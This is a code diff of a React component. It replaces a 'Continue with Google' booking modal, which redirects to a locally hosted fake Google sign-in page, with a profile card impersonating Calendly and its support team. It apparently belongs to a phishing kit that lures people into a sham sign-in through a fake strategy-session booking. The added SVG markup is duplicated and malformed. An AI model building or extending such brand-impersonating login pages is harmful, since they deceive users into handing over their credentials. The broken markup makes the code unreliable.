@@ -1,167 +1,95 @@
-import React, { useState } from 'react';
-import { X, Mail, Shield, CheckCircle, Clock, User } from 'lucide-react';
+import React from 'react';
+import { Clock, Video, MapPin, Calendar, User } from 'lucide-react';
 
-interface GoogleSignInProps {
-  isOpen: boolean;
-  onClose: () => void;
-  selectedDate: number;
-  selectedTime: string;
-  onBookingComplete: () => void;
-}
-
-const GoogleSignIn: React.FC<GoogleSignInProps> = ({ 
-  isOpen, 
-  onClose, 
-  selectedDate, 
-  selectedTime,
-  onBookingComplete 
-}) => {
-  const [isSigningIn, setIsSigningIn] = useState(false);
-  const [isBooking, setIsBooking] = useState(false);
-  const [isComplete, setIsComplete] = useState(false);
-
-  if (!isOpen) return null;
-
-  const handleGoogleSignIn = async () => {
-    // Store booking details in localStorage for the external script to access
-    const bookingData = {
-      selectedDate,
-      selectedTime,
-      dateName: getDateName(selectedDate),
-      timestamp: new Date().toISOString()
-    };
-    
-    localStorage.setItem('bookingData', JSON.stringify(bookingData));
-    
-    // Redirect to your external Google Sign-In page
-    window.location.href = '/google-auth/index.html';
-  };
-
-  const getDateName = (date: number) => {
-    const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
-    const dayIndex = date === 22 ? 1 : 2;
-    return `${days[dayIndex]}, July ${date}`;
-  };
-
+const UserProfile: React.FC = () => {
   return (
-    <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-      <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full max-h-[90vh] overflow-y-auto">
-        {/* Header */}
-        <div className="flex items-center justify-between p-6 border-b border-gray-100">
-          <div className="flex items-center">
-            <div className="w-8 h-8 bg-gradient-to-br from-indigo-600 to-purple-600 rounded-lg flex items-center justify-center text-white font-bold text-sm mr-3">
-              E
-            </div>
-            <h2 className="text-xl font-bold text-gray-900">Confirm Booking</h2>
+    <div className="bg-white rounded-2xl p-6 shadow-lg border border-gray-100">
+      {/* Company Header */}
+      <div className="mb-6">
+        <div className="flex items-center mb-4">
+          <div className="w-12 h-12 bg-gradient-to-br from-blue-600 to-indigo-600 rounded-xl flex items-center justify-center text-white font-bold text-lg shadow-lg">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect width="24" height="24" rx="6" fill="white"/>
+              <path d="M6 9C6 7.34315 7.34315 6 9 6H15C16.6569 6 18 7.34315 18 9V15C18 16.6569 16.6569 18 15 18H9C7.34315 18 6 16.6569 6 15V9Z" fill="#006BFF"/>
+              <path d="M9 10.5V13.5H10.5V12H13.5V10.5H9Z" fill="white"/>
+              <circle cx="14.25" cy="12.75" r="0.75" fill="white"/>
+            </svg>
+              <rect width="24" height="24" rx="6" fill="white"/>
+              <path d="M6 9C6 7.34315 7.34315 6 9 6H15C16.6569 6 18 7.34315 18 9V15C18 16.6569 16.6569 18 15 18H9C7.34315 18 6 16.6569 6 15V9Z" fill="#006BFF"/>
+              <path d="M9 10.5V13.5H10.5V12H13.5V10.5H9Z" fill="white"/>
+              <circle cx="14.25" cy="12.75" r="0.75" fill="white"/>
+            </svg>
           </div>
-          <button 
-            onClick={onClose}
-            className="p-2 hover:bg-gray-100 rounded-xl transition-colors duration-200"
-          >
-            <X size={20} className="text-gray-500" />
-          </button>
+          <div className="ml-3">
+            <h2 className="font-bold text-xl text-gray-900">Calendly</h2>
+            <p className="text-sm text-gray-500">Scheduling Made Simple</p>
+          </div>
+        </div>
+      </div>
+      
+      {/* Host Profile */}
+      <div className="flex items-center mb-6 p-4 bg-gradient-to-r from-gray-50 to-blue-50 rounded-xl">
+        <div className="relative">
+          <div className="w-14 h-14 bg-gradient-to-br from-blue-500 via-indigo-500 to-purple-600 rounded-full flex items-center justify-center text-white font-bold text-lg shadow-lg">
+            CS
+          </div>
+          <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-400 rounded-full border-2 border-white"></div>
+        </div>
+        <div className="ml-4">
+          <h3 className="font-semibold text-lg text-gray-900">Customer Success</h3>
+          <p className="text-sm text-gray-600">Calendly Support Team</p>
+          <div className="flex items-center mt-1">
+            <div className="w-2 h-2 bg-green-400 rounded-full mr-2"></div>
+            <span className="text-xs text-green-600 font-medium">Available now</span>
+          </div>
+        </div>
+      </div>
+      
+      {/* Meeting Details */}
+      <div className="border-t border-gray-100 pt-6">
+        <h4 className="font-bold text-lg text-gray-900 mb-4 flex items-center">
+          <Calendar size={20} className="mr-2 text-indigo-600" />
+          Client Strategy Session
+        </h4>
+        
+        <div className="space-y-4">
+          <div className="flex items-center text-gray-700 p-3 bg-gray-50 rounded-lg">
+            <Clock size={18} className="mr-3 text-indigo-600" />
+            <div>
+              <span className="font-medium">30 minutes</span>
+              <p className="text-sm text-gray-500">One-on-one consultation</p>
+            </div>
+          </div>
+          
+          <div className="flex items-center text-gray-700 p-3 bg-gray-50 rounded-lg">
+            <Video size={18} className="mr-3 text-indigo-600" />
+            <div>
+              <span className="font-medium">Zoom Meeting</span>
+              <p className="text-sm text-gray-500">Link will be sent via email</p>
+            </div>
+          </div>
+          
+          <div className="flex items-center text-gray-700 p-3 bg-gray-50 rounded-lg">
+            <MapPin size={18} className="mr-3 text-indigo-600" />
+            <div>
+              <span className="font-medium">Remote Session</span>
+              <p className="text-sm text-gray-500">Join from anywhere</p>
+            </div>
+          </div>
         </div>
 
-        {/* Content */}
-        <div className="p-6">
-          {!isComplete ? (
-            <>
-              {/* Booking Summary */}
-              <div className="bg-gradient-to-r from-indigo-50 to-purple-50 rounded-2xl p-4 mb-6 border border-indigo-100">
-                <h3 className="font-semibold text-gray-900 mb-3">Booking Summary</h3>
-                <div className="space-y-2 text-sm">
-                  <div className="flex items-center text-gray-700">
-                    <Clock size={16} className="mr-2 text-indigo-600" />
-                    <span>{getDateName(selectedDate)} at {selectedTime}</span>
-                  </div>
-                  <div className="flex items-center text-gray-700">
-                    <Mail size={16} className="mr-2 text-indigo-600" />
-                    <span>Client Strategy Session (30 min)</span>
-                  </div>
-                  <div className="flex items-center text-gray-700">
-                    <User size={16} className="mr-2 text-indigo-600" />
-                    <span>With Matthew Mee, Global Chief Strategy Officer</span>
-                  </div>
-                </div>
-              </div>
-
-              {/* Sign In Section */}
-              <div className="text-center mb-6">
-                <h3 className="text-lg font-semibold text-gray-900 mb-2">
-                  {isSigningIn ? 'Signing you in...' : isBooking ? 'Confirming your booking...' : 'Sign in to confirm your booking'}
-                </h3>
-                <p className="text-gray-600 text-sm mb-6">
-                  {isSigningIn ? 'Please wait while we authenticate your account...' : 
-                   isBooking ? 'We\'re securing your appointment slot...' :
-                   'We\'ll send you a confirmation email and calendar invite'}
-                </p>
-
-                {isSigningIn ? (
-                  <div className="flex items-center justify-center py-8">
-                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-600"></div>
-                    <span className="ml-3 text-gray-600">Authenticating...</span>
-                  </div>
-                ) : isBooking ? (
-                  <div className="flex items-center justify-center py-8">
-                    <div className="animate-pulse flex items-center">
-                      <div className="w-3 h-3 bg-indigo-600 rounded-full mr-2"></div>
-                      <div className="w-3 h-3 bg-indigo-400 rounded-full mr-2"></div>
-                      <div className="w-3 h-3 bg-indigo-300 rounded-full"></div>
-                    </div>
-                    <span className="ml-3 text-gray-600">Booking your session...</span>
-                  </div>
-                ) : (
-                  <button
-                    onClick={handleGoogleSignIn}
-                    className="w-full bg-white border-2 border-gray-300 rounded-xl py-4 px-6 flex items-center justify-center hover:bg-gray-50 hover:border-gray-400 transition-all duration-200 shadow-sm hover:shadow-md group"
-                  >
-                    <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24">
-                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-                    </svg>
-                    <span className="font-semibold text-gray-700 group-hover:text-gray-900">Continue with Google</span>
-                  </button>
-                )}
-              </div>
-
-              {/* Security Notice */}
-              {!isSigningIn && !isBooking && (
-                <div className="bg-gray-50 rounded-xl p-4 border border-gray-200">
-                  <div className="flex items-start">
-                    <Shield size={16} className="text-green-500 mr-2 mt-0.5 flex-shrink-0" />
-                    <div className="text-xs text-gray-600">
-                      <p className="font-medium text-gray-700 mb-1">Your privacy is protected</p>
-                      <p>We only use your email to send booking confirmations and meeting details. Your information is never shared with third parties.</p>
-                    </div>
-                  </div>
-                </div>
-              )}
-            </>
-          ) : (
-            /* Success State */
-            <div className="text-center py-8">
-              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                <CheckCircle size={32} className="text-green-600" />
-              </div>
-              <h3 className="text-xl font-bold text-gray-900 mb-2">Booking Confirmed!</h3>
-              <p className="text-gray-600 mb-4">
-                Your strategy session with Matthew Mee is confirmed for {getDateName(selectedDate)} at {selectedTime}.
-              </p>
-              <div className="bg-green-50 rounded-xl p-4 border border-green-200">
-                <p className="text-sm text-green-700">
-                  📧 Confirmation email sent<br/>
-                  📅 Calendar invite added<br/>
-                  🔗 Zoom link will be provided 15 minutes before the meeting
-                </p>
-              </div>
-            </div>
-          )}
+        {/* Additional Info */}
+        <div className="mt-6 p-4 bg-indigo-50 rounded-lg border border-indigo-100">
+          <h5 className="font-semibold text-indigo-900 mb-2">What to expect:</h5>
+          <ul className="text-sm text-indigo-700 space-y-1">
+            <li>• Marketing strategy review</li>
+            <li>• Campaign optimization tips</li>
+            <li>• Q&A session</li>
+          </ul>
         </div>
       </div>
     </div>
   );
 };
 
-export default GoogleSignIn;
+export default UserProfile;
